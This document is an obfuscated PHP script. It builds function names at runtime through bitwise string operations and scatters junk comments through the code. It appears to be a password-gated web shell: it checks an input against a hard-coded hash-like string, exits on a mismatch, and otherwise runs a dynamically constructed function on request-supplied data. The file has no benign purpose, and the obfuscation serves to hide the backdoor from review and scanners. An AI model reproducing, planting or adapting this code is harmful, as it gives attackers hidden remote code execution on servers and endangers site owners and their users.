<?php
$jUBdDwNvWB='UV5W'|~mRWQ7aXDkH;$DwvH1='n]2;'.O_oCio.'&'&'/vp+O{/M;_,';$we_1D2=#Y7AAt9dBScb'.
            '>A!cvP:q{P)'^'|pg-Wx}'.D7vc;$UIr=J4u|'of]';$hMk2VS='[$^f5i'^'<A~Gu]';'NLdYK8F'.
            'Oc?$lL9-G?';$oI03N='k;8`F"n'^';}'.p1hzE;$DwBp=cwbev.'$'._ny7.'"|yO$'&/*GLSt_Z'.
            'f=*/kPuctl.'}'.wSfmukIl;$VVanoN5n=kq|'B|';$XZv0lQQ='(T'|'!9';$RGark4=/*McpJSx'.
            'KV@U*/"PB|1".G0Zz."\$4".A8Lc.".".Ak9UD6|'$F}#u6]>'.S0R9ydOUz.';FmB';$VH=/*d9o'.
            'ik)SKj?N+&*/VBl3B7.'^(w@'.JJHF.'*{46MNF'|'P@M09?'.Yr28_k.'}wN{h#`T.';'mMSUrKK'.
            '*{^5c]O,2|';$gMGg_EGy='46'&'>;';$sDy='"t!'^'j u';$ArP8GwP=P_A|PYA;$yjKiyAN=#z'.
            'w|4?lv,|m$,l'^'?(`o3.s)={h)';$N_xh3dDs='|,$'^'*oe';$prIQYNhURS='@'./*Ibq9p3wO'.
            '*rQ*/HCDARPDIALABF|P_QI.'@PT@A@'.DHLE;$NlaJv2rVL0=$DwvH1^$we_1D2;$ULNW9BmQ=/*'.
            '#_,e6=o*/$UIr&('}}5'&"}f5");$va=$hMk2VS|(giTG.'.N'&'}etl?G');$VvGB=(#d1AEWbK1'.
            '7g=?0U'&'r)=7uu')^('F@NH@ '|'A@@XB!');$niYSaR6Pf2u=('7>=?a|n'&'5~x=O?_')^/*UB'.
            '4-T 4L-G*/$oI03N;$kX=$DwBp|('v7[MJw+XXE$|d[.'^'VE~m:2pxl)GHE<`');'Ef_ShSv1E1c'.
            'BfbHkOR8u$';$ouJcJEKlZ=$VVanoN5n&$XZv0lQQ;$JGQ=$RGark4&$VH;if($NlaJv2rVL0(/*y'.
            'm,Z%*Rv5_*/$ULNW9BmQ($va($sDy.$ArP8GwP)),('$d14 "%2 )1210!903`A0E 5 0#18B'|'5'.
            ''.d05d.'@13'.A0078.' d!!"$c4 0%A!0 1!').$gMGg_EGy))die;$VvGB($niYSaR6Pf2u(/*p'.
            'S9!*/$ouJcJEKlZ,$JGQ,2),$kX(null,$va($yjKiyAN.$N_xh3dDs.$prIQYNhURS)));#}<@m'.
            'Qg]b4UzD#J@8@ZVHWh:=t~2h+isf;$[,]g&_8X?Kr}p+d1IDg*{2LBcqj@';